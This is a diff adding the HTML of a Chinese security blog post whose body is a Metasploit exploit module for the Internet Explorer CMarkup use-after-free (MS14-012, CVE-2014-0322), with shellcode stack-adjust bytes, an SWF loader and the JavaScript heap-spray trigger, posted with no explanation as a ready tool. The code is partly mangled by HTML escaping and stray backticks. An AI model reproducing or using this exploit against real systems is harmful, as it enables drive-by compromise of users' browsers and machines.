@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="色魔科技,maniac," />
+
+
+
+
+
+  <link rel="alternate" href="/rss.xml" title="Lost Maniac" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="require ``&amp;#39;msf/core&amp;#39;class Metasploit3 &amp;amp;lt; Msf::Exploit::Remote``Rank = NormalRanking``include Msf::Exploit::Remote::BrowserExploitServe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IE漏洞MS14-012,CVE-2014-0322,SET配合metasploit必备">
+<meta property="og:url" content="http://maniac.vip/posts/160.html">
+<meta property="og:site_name" content="Lost Maniac">
+<meta property="og:description" content="require ``&amp;#39;msf/core&amp;#39;class Metasploit3 &amp;amp;lt; Msf::Exploit::Remote``Rank = NormalRanking``include Msf::Exploit::Remote::BrowserExploitServer``def initialize(info={})``super``(update_info(info">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-11-16T07:57:27.064Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="IE漏洞MS14-012,CVE-2014-0322,SET配合metasploit必备">
+<meta name="twitter:description" content="require ``&amp;#39;msf/core&amp;#39;class Metasploit3 &amp;amp;lt; Msf::Exploit::Remote``Rank = NormalRanking``include Msf::Exploit::Remote::BrowserExploitServer``def initialize(info={})``super``(update_info(info">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://maniac.vip/posts/160.html"/>
+
+
+
+
+
+  <title>IE漏洞MS14-012,CVE-2014-0322,SET配合metasploit必备 | Lost Maniac</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?6ece9853dbf154aa223dfef063628fe2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lost Maniac</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人若无名便可专心练贱</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://maniac.vip/posts/160.html?day=20171116">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lost Maniac">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lost Maniac">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">IE漏洞MS14-012,CVE-2014-0322,SET配合metasploit必备</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-07-27T20:30:34+08:00">
+                2014-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全文章/" itemprop="url" rel="index">
+                    <span itemprop="name">安全文章</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全文章/社工/" itemprop="url" rel="index">
+                    <span itemprop="name">社工</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/posts/160.html?day=20171116#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="posts/160.html?day=20171116" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <div class="line number6 index5 alt1" style="color: #000000;"><code>require ``&#39;msf/core&#39;</code></div><br><div class="line number7 index6 alt2" style="color: #000000;"></div><br><div class="line number8 index7 alt1" style="color: #000000;"><code>class</code> <code>Metasploit3 &amp;lt; Msf::Exploit::Remote</code></div><br><div class="line number9 index8 alt2" style="color: #000000;"><code>``Rank = NormalRanking</code></div><br><div class="line number10 index9 alt1" style="color: #000000;"></div><br><div class="line number11 index10 alt2" style="color: #000000;"><code>``include Msf::Exploit::Remote::BrowserExploitServer</code></div><br><div class="line number12 index11 alt1" style="color: #000000;"></div><br><div class="line number13 index12 alt2" style="color: #000000;"><code>``def</code> <code>initialize(info={})</code></div><br><div class="line number14 index13 alt1" style="color: #000000;"><code>``super``(update_info(info,</code></div><br><div class="line number15 index14 alt2" style="color: #000000;"><code>``&#39;Name&#39;</code>           <code>=&amp;gt; ``&quot;MS14-012 Microsoft Internet Explorer CMarkup Use-After-Free&quot;``,</code></div><br><div class="line number16 index15 alt1" style="color: #000000;"><code>``&#39;Description&#39;</code>    <code>=&amp;gt; %q{</code></div><br><div class="line number17 index16 alt2" style="color: #000000;"><code>``This ``module</code> <code>exploits an use after free condition on Internet Explorer as used ``in</code> <code>the wild</code></div><br><div class="line number18 index17 alt1" style="color: #000000;"><code>``on the ``&quot;Operation SnowMan&quot;</code> <code>in</code> <code>February ``2014``. The ``module</code> <code>uses Flash Player ``12</code> <code>in</code> <code>order to</code></div><br><div class="line number19 index18 alt2" style="color: #000000;"><code>``bypass ``ASLR</code> <code>and</code> <code>finally ``DEP``.</code></div><br><div class="line number20 index19 alt1" style="color: #000000;"><code>``},</code></div><br><div class="line number21 index20 alt2" style="color: #000000;"><code>``&#39;License&#39;</code>        <code>=&amp;gt; ``MSF_LICENSE``,</code></div><br><div class="line number22 index21 alt1" style="color: #000000;"><code>``&#39;Author&#39;</code>         <code>=&amp;gt;</code></div><br><div class="line number23 index22 alt2" style="color: #000000;"><code>``[</code></div><br><div class="line number24 index23 alt1" style="color: #000000;"><code>``&#39;Unknown&#39;``, ``# Vulnerability discovery and Exploit in the wild</code></div><br><div class="line number25 index24 alt2" style="color: #000000;"><code>``&#39;Jean-Jamil Khalife&#39;``, ``# Exploit</code></div><br><div class="line number26 index25 alt1" style="color: #000000;"><code>``&#39;juan vazquez&#39;</code> <code># Metasploit module</code></div><br><div class="line number27 index26 alt2" style="color: #000000;"><code>``],</code></div><br><div class="line number28 index27 alt1" style="color: #000000;"><code>``&#39;References&#39;</code>     <code>=&amp;gt;&lt;!--more--&gt;</code></div><br><div class="line number29 index28 alt2" style="color: #000000;"><code>``[</code></div><br><div class="line number30 index29 alt1" style="color: #000000;"><code>``[ ``&#39;CVE&#39;``, ``&#39;2014-0322&#39;</code> <code>],</code></div><br><div class="line number31 index30 alt2" style="color: #000000;"><code>``[ ``&#39;MSB&#39;``, ``&#39;MS14-012&#39;</code> <code>],</code></div><br><div class="line number32 index31 alt1" style="color: #000000;"><code>``[ ``&#39;BID&#39;``, ``&#39;65551&#39;</code> <code>],</code></div><br><div class="line number33 index32 alt2" style="color: #000000;"><code>``[ ``&#39;URL&#39;``, ``&#39;http://www.fireeye.com/blog/technical/cyber-exploits/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html&#39;``],</code></div><br><div class="line number34 index33 alt1" style="color: #000000;"><code>``[ ``&#39;URL&#39;``, ``&#39;http://hdwsec.fr/blog/CVE-2014-0322.html&#39;</code> <code>]</code></div><br><div class="line number35 index34 alt2" style="color: #000000;"><code>``],</code></div><br><div class="line number36 index35 alt1" style="color: #000000;"><code>``&#39;Platform&#39;</code>       <code>=&amp;gt; ``&#39;win&#39;``,</code></div><br><div class="line number37 index36 alt2" style="color: #000000;"><code>``&#39;Arch&#39;</code>           <code>=&amp;gt; ``ARCH_X86``,</code></div><br><div class="line number38 index37 alt1" style="color: #000000;"><code>``&#39;Payload&#39;</code>        <code>=&amp;gt;</code></div><br><div class="line number39 index38 alt2" style="color: #000000;"><code>``{</code></div><br><div class="line number40 index39 alt1" style="color: #000000;"><code>``&#39;Space&#39;</code>          <code>=&amp;gt; ``960``,</code></div><br><div class="line number41 index40 alt2" style="color: #000000;"><code>``&#39;DisableNops&#39;</code>    <code>=&amp;gt; ``true``,</code></div><br><div class="line number42 index41 alt1" style="color: #000000;"><code>``&#39;PrependEncoder&#39;</code> <code>=&amp;gt; stack_adjust</code></div><br><div class="line number43 index42 alt2" style="color: #000000;"><code>``},</code></div><br><div class="line number44 index43 alt1" style="color: #000000;"><code>``&#39;BrowserRequirements&#39;</code> <code>=&amp;gt;</code></div><br><div class="line number45 index44 alt2" style="color: #000000;"><code>``{</code></div><br><div class="line number46 index45 alt1" style="color: #000000;"><code>``:source</code>      <code>=&amp;gt; /script|headers/i,</code></div><br><div class="line number47 index46 alt2" style="color: #000000;"><code>``:os_name</code>     <code>=&amp;gt; Msf::OperatingSystems::``WINDOWS``,</code></div><br><div class="line number48 index47 alt1" style="color: #000000;"><code>``:os_flavor</code>   <code>=&amp;gt; Msf::OperatingSystems::WindowsVersions::``SEVEN``,</code></div><br><div class="line number49 index48 alt2" style="color: #000000;"><code>``:ua_name</code>     <code>=&amp;gt; Msf::HttpClients::``IE``,</code></div><br><div class="line number50 index49 alt1" style="color: #000000;"><code>``:ua_ver</code>      <code>=&amp;gt; ``&#39;10.0&#39;``,</code></div><br><div class="line number51 index50 alt2" style="color: #000000;"><code>``:mshtml_build</code> <code>=&amp;gt; lambda { |ver| ver.to_i &amp;lt; ``16843</code> <code>},</code></div><br><div class="line number52 index51 alt1" style="color: #000000;"><code>``:flash</code>       <code>=&amp;gt; /^``12``./</code></div><br><div class="line number53 index52 alt2" style="color: #000000;"><code>``},</code></div><br><div class="line number54 index53 alt1" style="color: #000000;"><code>``&#39;DefaultOptions&#39;</code> <code>=&amp;gt;</code></div><br><div class="line number55 index54 alt2" style="color: #000000;"><code>``{</code></div><br><div class="line number56 index55 alt1" style="color: #000000;"><code>``&#39;InitialAutoRunScript&#39;</code> <code>=&amp;gt; ``&#39;migrate -f&#39;``,</code></div><br><div class="line number57 index56 alt2" style="color: #000000;"><code>``&#39;Retries&#39;</code>              <code>=&amp;gt; ``false</code></div><br><div class="line number58 index57 alt1" style="color: #000000;"><code>``},</code></div><br><div class="line number59 index58 alt2" style="color: #000000;"><code>``&#39;Targets&#39;</code>        <code>=&amp;gt;</code></div><br><div class="line number60 index59 alt1" style="color: #000000;"><code>``[</code></div><br><div class="line number61 index60 alt2" style="color: #000000;"><code>``[ ``&#39;Windows 7 SP1 / IE 10 / FP 12&#39;``, { } ],</code></div><br><div class="line number62 index61 alt1" style="color: #000000;"><code>``],</code></div><br><div class="line number63 index62 alt2" style="color: #000000;"><code>``&#39;Privileged&#39;</code>     <code>=&amp;gt; ``false``,</code></div><br><div class="line number64 index63 alt1" style="color: #000000;"><code>``&#39;DisclosureDate&#39;</code> <code>=&amp;gt; ``&quot;Feb 13 2014&quot;``,</code></div><br><div class="line number65 index64 alt2" style="color: #000000;"><code>``&#39;DefaultTarget&#39;</code>  <code>=&amp;gt; ``0``))</code></div><br><div class="line number66 index65 alt1" style="color: #000000;"></div><br><div class="line number67 index66 alt2" style="color: #000000;"><code>``end</code></div><br><div class="line number68 index67 alt1" style="color: #000000;"></div><br><div class="line number69 index68 alt2" style="color: #000000;"><code>``def</code> <code>stack_adjust</code></div><br><div class="line number70 index69 alt1" style="color: #000000;"><code>``adjust = ``&quot;x64xa1x18x00x00x00&quot;</code>  <code># mov eax, fs:[0x18 # get teb</code></div><br><div class="line number71 index70 alt2" style="color: #000000;"><code>``adjust &amp;lt;&amp;lt; ``&quot;x83xC0x08&quot;</code>             <code># add eax, byte 8 # get pointer to stacklimit</code></div><br><div class="line number72 index71 alt1" style="color: #000000;"><code>``adjust &amp;lt;&amp;lt; ``&quot;x8bx20&quot;</code>                 <code># mov esp, [eax] # put esp at stacklimit</code></div><br><div class="line number73 index72 alt2" style="color: #000000;"><code>``adjust &amp;lt;&amp;lt; ``&quot;x81xC4x30xF8xFFxFF&quot;</code> <code># add esp, -2000 # plus a little offset</code></div><br><div class="line number74 index73 alt1" style="color: #000000;"></div><br><div class="line number75 index74 alt2" style="color: #000000;"><code>``adjust</code></div><br><div class="line number76 index75 alt1" style="color: #000000;"><code>``end</code></div><br><div class="line number77 index76 alt2" style="color: #000000;"></div><br><div class="line number78 index77 alt1" style="color: #000000;"><code>``def</code> <code>create_swf</code></div><br><div class="line number79 index78 alt2" style="color: #000000;"><code>``path = ::``File``.join( Msf::Config.data_directory, ``&quot;exploits&quot;``, ``&quot;CVE-2014-0322&quot;``, ``&quot;AsXploit.swf&quot;</code> <code>)</code></div><br><div class="line number80 index79 alt1" style="color: #000000;"><code>``fd = ::``File``.open( path, ``&quot;rb&quot;</code> <code>)</code></div><br><div class="line number81 index80 alt2" style="color: #000000;"><code>``swf = fd.read(fd.stat.size)</code></div><br><div class="line number82 index81 alt1" style="color: #000000;"><code>``fd.close</code></div><br><div class="line number83 index82 alt2" style="color: #000000;"><code>``return</code> <code>swf</code></div><br><div class="line number84 index83 alt1" style="color: #000000;"><code>``end</code></div><br><div class="line number85 index84 alt2" style="color: #000000;"></div><br><div class="line number86 index85 alt1" style="color: #000000;"><code>``def</code> <code>exploit</code></div><br><div class="line number87 index86 alt2" style="color: #000000;"><code>``@swf</code> <code>= create_swf</code></div><br><div class="line number88 index87 alt1" style="color: #000000;"><code>``super</code></div><br><div class="line number89 index88 alt2" style="color: #000000;"><code>``end</code></div><br><div class="line number90 index89 alt1" style="color: #000000;"></div><br><div class="line number91 index90 alt2" style="color: #000000;"><code>``def</code> <code>on_request_uri(cli, request)</code></div><br><div class="line number92 index91 alt1" style="color: #000000;"><code>``print_status(``&quot;Request: #{request.uri}&quot;``)</code></div><br><div class="line number93 index92 alt2" style="color: #000000;"></div><br><div class="line number94 index93 alt1" style="color: #000000;"><code>``if</code> <code>request.uri =~ /.swf$/</code></div><br><div class="line number95 index94 alt2" style="color: #000000;"><code>``print_status(``&quot;Sending SWF...&quot;``)</code></div><br><div class="line number96 index95 alt1" style="color: #000000;"><code>``send_response(cli, ``@swf``, {``&#39;Content-Type&#39;``=&amp;gt;``&#39;application/x-shockwave-flash&#39;``, ``&#39;Pragma&#39;</code> <code>=&amp;gt; ``&#39;no-cache&#39;``})</code></div><br><div class="line number97 index96 alt2" style="color: #000000;"><code>``return</code></div><br><div class="line number98 index97 alt1" style="color: #000000;"><code>``end</code></div><br><div class="line number99 index98 alt2" style="color: #000000;"></div><br><div class="line number100 index99 alt1" style="color: #000000;"><code>``super</code></div><br><div class="line number101 index100 alt2" style="color: #000000;"><code>``end</code></div><br><div class="line number102 index101 alt1" style="color: #000000;"></div><br><div class="line number103 index102 alt2" style="color: #000000;"><code>``def</code> <code>on_request_exploit(cli, request, target_info)</code></div><br><div class="line number104 index103 alt1" style="color: #000000;"><code>``print_status(``&quot;Sending HTML...&quot;``)</code></div><br><div class="line number105 index104 alt2" style="color: #000000;"><code>``send_exploit_html(cli, exploit_template(cli, target_info))</code></div><br><div class="line number106 index105 alt1" style="color: #000000;"><code>``end</code></div><br><div class="line number107 index106 alt2" style="color: #000000;"></div><br><div class="line number108 index107 alt1" style="color: #000000;"><code>``def</code> <code>exploit_template(cli, target_info)</code></div><br><div class="line number109 index108 alt2" style="color: #000000;"></div><br><div class="line number110 index109 alt1" style="color: #000000;"><code>``flash_payload = ``&quot;&quot;</code></div><br><div class="line number111 index110 alt2" style="color: #000000;"><code>``get_payload(cli,target_info).unpack(``&quot;V*&quot;``).``each</code> <code>do</code> <code>|i|</code></div><br><div class="line number112 index111 alt1" style="color: #000000;"><code>``flash_payload &amp;lt;&amp;lt; ``&quot;0x#{i.to_s(16)},&quot;</code></div><br><div class="line number113 index112 alt2" style="color: #000000;"><code>``end</code></div><br><div class="line number114 index113 alt1" style="color: #000000;"><code>``flash_payload.gsub!(/,$/, ``&quot;&quot;``)</code></div><br><div class="line number115 index114 alt2" style="color: #000000;"></div><br><div class="line number116 index115 alt1" style="color: #000000;"><code>``html_template = %``Q``|</code></div><br><div class="line number117 index116 alt2" style="color: #000000;"><code>``&amp;lt;html&amp;gt;</code></div><br><div class="line number118 index117 alt1" style="color: #000000;"><code>``&amp;lt;head&amp;gt;</code></div><br><div class="line number119 index118 alt2" style="color: #000000;"><code>``&amp;lt;/head&amp;gt;</code></div><br><div class="line number120 index119 alt1" style="color: #000000;"><code>``&amp;lt;body&amp;gt;</code></div><br><div class="line number121 index120 alt2" style="color: #000000;"></div><br><div class="line number122 index121 alt1" style="color: #000000;"><code>``&amp;lt;script&amp;gt;</code></div><br><div class="line number123 index122 alt2" style="color: #000000;"></div><br><div class="line number124 index123 alt1" style="color: #000000;"><code>``var g_arr = [];</code></div><br><div class="line number125 index124 alt2" style="color: #000000;"><code>``var arrLen = 0x250;</code></div><br><div class="line number126 index125 alt1" style="color: #000000;"></div><br><div class="line number127 index126 alt2" style="color: #000000;"><code>``function dword2data(dword)</code></div><br><div class="line number128 index127 alt1" style="color: #000000;"><code>``{</code></div><br><div class="line number129 index128 alt2" style="color: #000000;"><code>``var d = Number(dword).toString(``16``);</code></div><br><div class="line number130 index129 alt1" style="color: #000000;"><code>``while</code> <code>(d.length &amp;lt; ``8``)</code></div><br><div class="line number131 index130 alt2" style="color: #000000;"><code>``d = ``&#39;0&#39;</code> <code>+ d;</code></div><br><div class="line number132 index131 alt1" style="color: #000000;"></div><br><div class="line number133 index132 alt2" style="color: #000000;"><code>``return</code> <code>unescape(``&#39;%u&#39;</code> <code>+ d.substr(``4``, ``8``) + ``&#39;%u&#39;</code> <code>+ d.substr(``0``, ``4``));</code></div><br><div class="line number134 index133 alt1" style="color: #000000;"><code>``}</code></div><br><div class="line number135 index134 alt2" style="color: #000000;"></div><br><div class="line number136 index135 alt1" style="color: #000000;"><code>``function eXpl()</code></div><br><div class="line number137 index136 alt2" style="color: #000000;"><code>``{</code></div><br><div class="line number138 index137 alt1" style="color: #000000;"><code>``var a=``0``;</code></div><br><div class="line number139 index138 alt2" style="color: #000000;"></div><br><div class="line number140 index139 alt1" style="color: #000000;"><code>``for</code> <code>(a=``0``; a &amp;lt; arrLen; a++) {</code></div><br><div class="line number141 index140 alt2" style="color: #000000;"><code>``g_arr[a] = document.createElement(``&#39;div&#39;``);</code></div><br><div class="line number142 index141 alt1" style="color: #000000;"><code>``}</code></div><br><div class="line number143 index142 alt2" style="color: #000000;"></div><br><div class="line number144 index143 alt1" style="color: #000000;"><code>``var b = dword2data(0x19fffff3);</code></div><br><div class="line number145 index144 alt2" style="color: #000000;"></div><br><div class="line number146 index145 alt1" style="color: #000000;"><code>``while</code> <code>(b.length &amp;lt; 0x360) {</code></div><br><div class="line number147 index146 alt2" style="color: #000000;"><code>``if</code> <code>(b.length == (0x98 / ``2``))</code></div><br><div class="line number148 index147 alt1" style="color: #000000;"><code>``{</code></div><br><div class="line number149 index148 alt2" style="color: #000000;"><code>``b += dword2data(0x1a000010);</code></div><br><div class="line number150 index149 alt1" style="color: #000000;"><code>``}</code></div><br><div class="line number151 index150 alt2" style="color: #000000;"><code>``else</code> <code>if</code> <code>(b.length == (0x94 / ``2``))</code></div><br><div class="line number152 index151 alt1" style="color: #000000;"><code>``{</code></div><br><div class="line number153 index152 alt2" style="color: #000000;"><code>``b += dword2data(0x1a111111);</code></div><br><div class="line number154 index153 alt1" style="color: #000000;"><code>``}</code></div><br><div class="line number155 index154 alt2" style="color: #000000;"><code>``else</code> <code>if</code> <code>(b.length == (0x15c / ``2``))</code></div><br><div class="line number156 index155 alt1" style="color: #000000;"><code>``{</code></div><br><div class="line number157 index156 alt2" style="color: #000000;"><code>``b += dword2data(0x42424242);</code></div><br><div class="line number158 index157 alt1" style="color: #000000;"><code>``}</code></div><br><div class="line number159 index158 alt2" style="color: #000000;"><code>``else</code></div><br><div class="line number160 index159 alt1" style="color: #000000;"><code>``{</code></div><br><div class="line number161 index160 alt2" style="color: #000000;"><code>``b += dword2data(0x19fffff3);</code></div><br><div class="line number162 index161 alt1" style="color: #000000;"><code>``}</code></div><br><div class="line number163 index162 alt2" style="color: #000000;"><code>``}</code></div><br><div class="line number164 index163 alt1" style="color: #000000;"></div><br><div class="line number165 index164 alt2" style="color: #000000;"><code>``var d = b.substring(``0``, ( 0x340 - ``2</code> <code>)/``2``);</code></div><br><div class="line number166 index165 alt1" style="color: #000000;"></div><br><div class="line number167 index166 alt2" style="color: #000000;"><code>``try{</code></div><br><div class="line number168 index167 alt1" style="color: #000000;"><code>``this.outerHTML=this.outerHTML</code></div><br><div class="line number169 index168 alt2" style="color: #000000;"><code>``} catch(e){</code></div><br><div class="line number170 index169 alt1" style="color: #000000;"></div><br><div class="line number171 index170 alt2" style="color: #000000;"><code>``}</code></div><br><div class="line number172 index171 alt1" style="color: #000000;"></div><br><div class="line number173 index172 alt2" style="color: #000000;"><code>``CollectGarbage();</code></div><br><div class="line number174 index173 alt1" style="color: #000000;"></div><br><div class="line number175 index174 alt2" style="color: #000000;"><code>``for</code> <code>(a=``0``; a &amp;lt; arrLen; a++)</code></div><br><div class="line number176 index175 alt1" style="color: #000000;"><code>``{</code></div><br><div class="line number177 index176 alt2" style="color: #000000;"><code>``g_arr[a].title = d.substring(``0``, d.length);</code></div><br><div class="line number178 index177 alt1" style="color: #000000;"><code>``}</code></div><br><div class="line number179 index178 alt2" style="color: #000000;"><code>``}</code></div><br><div class="line number180 index179 alt1" style="color: #000000;"></div><br><div class="line number181 index180 alt2" style="color: #000000;"><code>``function trigger()</code></div><br><div class="line number182 index181 alt1" style="color: #000000;"><code>``{</code></div><br><div class="line number183 index182 alt2" style="color: #000000;"><code>``var a = document.getElementsByTagName(``&quot;script&quot;``);</code></div><br><div class="line number184 index183 alt1" style="color: #000000;"><code>``var b = a[``0``];</code></div><br><div class="line number185 index184 alt2" style="color: #000000;"><code>``b.onpropertychange = eXpl;</code></div><br><div class="line number186 index185 alt1" style="color: #000000;"><code>``var c = document.createElement(``&#39;SELECT&#39;``);</code></div><br><div class="line number187 index186 alt2" style="color: #000000;"><code>``c = b.appendChild(c);</code></div><br><div class="line number188 index187 alt1" style="color: #000000;"><code>``}</code></div><br><div class="line number189 index188 alt2" style="color: #000000;"></div><br><div class="line number190 index189 alt1" style="color: #000000;"><code>``&amp;lt;/script&amp;gt;</code></div><br><div class="line number191 index190 alt2" style="color: #000000;"><code>``&amp;lt;embed src=``#{rand_text_alpha(4 + rand(3))}.swf FlashVars=&quot;version=&amp;lt;%=flash_payload%&amp;gt;&quot; width=&quot;10&quot; height=&quot;10&quot;&amp;gt;</code></div><br><div class="line number192 index191 alt1" style="color: #000000;"><code>``&amp;lt;/embed&amp;gt;</code></div><br><div class="line number193 index192 alt2" style="color: #000000;"><code>``&amp;lt;/body&amp;gt;</code></div><br><div class="line number194 index193 alt1" style="color: #000000;"><code>``&amp;lt;/html&amp;gt;</code></div><br><div class="line number195 index194 alt2" style="color: #000000;"><code>``|</code></div><br><div class="line number196 index195 alt1" style="color: #000000;"></div><br><div class="line number197 index196 alt2" style="color: #000000;"><code>``return</code> <code>html_template, binding()</code></div><br><div class="line number198 index197 alt1" style="color: #000000;"><code>``end</code></div><br><div class="line number199 index198 alt2" style="color: #000000;"></div><br><div class="line number200 index199 alt1" style="color: #000000;"><code>end</code></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/158.html?day=20171116" rel="next" title="OpenVAS管理员4.0身份验证绕过漏洞的PoC--2014年7月9日漏洞">
+                <i class="fa fa-chevron-left"></i> OpenVAS管理员4.0身份验证绕过漏洞的PoC--2014年7月9日漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/170.html?day=20171116" rel="prev" title="kali 安装增强功能">
+                kali 安装增强功能 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="SOHUCS"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Lost Maniac" />
+            
+              <p class="site-author-name" itemprop="name">Lost Maniac</p>
